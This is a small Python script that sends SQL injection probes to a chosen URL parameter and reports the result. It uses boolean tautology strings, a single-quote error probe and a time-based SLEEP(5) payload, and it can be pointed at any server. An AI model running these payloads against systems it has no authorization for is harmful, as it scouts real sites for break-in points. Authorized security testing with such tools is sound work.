import requests
import time
import argparse
from urllib.parse import urlparse, parse_qs, urlunparse

class SQLInjectionTool:
    def __init__(self, url, param):
        self.url = url
        self.param = param

    def construct_url(self, payload):
        parsed_url = urlparse(self.url)
        query = parse_qs(parsed_url.query)
        query[self.param] = [payload]
        new_query = '&'.join([f"{k}={v[0]}" for k, v in query.items()])
        new_url = urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, new_query, parsed_url.fragment))
        return new_url

    def boolean_based_detection(self):
        payload_true = "' OR '1'='1"
        payload_false = "' OR '1'='0"
        response_true = requests.get(self.construct_url(payload_true))
        response_false = requests.get(self.construct_url(payload_false))
        if response_true.text != response_false.text:
            return f"Boolean-Based Injection detected on parameter {self.param}!"
        return f"No Boolean-Based Injection detected on parameter {self.param}."

    def error_based_detection(self):
        payload = "'"
        response = requests.get(self.construct_url(payload))
        if "error" in response.text.lower():
            return f"Error-Based Injection detected on parameter {self.param}!"
        return f"No Error-Based Injection detected on parameter {self.param}."

    def time_based_detection(self):
        payload = "' OR IF(1=1, SLEEP(5), 0)-- "
        start_time = time.time()
        requests.get(self.construct_url(payload))
        if time.time() - start_time > 5:
            return f"Time-Based Injection detected on parameter {self.param}!"
        return f"No Time-Based Injection detected on parameter {self.param}."

    def run(self):
        results = []
        results.append(self.boolean_based_detection())
        results.append(self.error_based_detection())
        results.append(self.time_based_detection())
        return results

def main():
    parser = argparse.ArgumentParser(description='SQL Injection Detection Tool')
    parser.add_argument('--url', required=True, help='URL to test for SQL injection')
    parser.add_argument('--param', required=True, help='Parameter to test for SQL injection')
    args = parser.parse_args()

    sql_tool = SQLInjectionTool(args.url, args.param)
    results = sql_tool.run()
    for result in results:
        print(result)

if __name__ == "__main__":
    main()
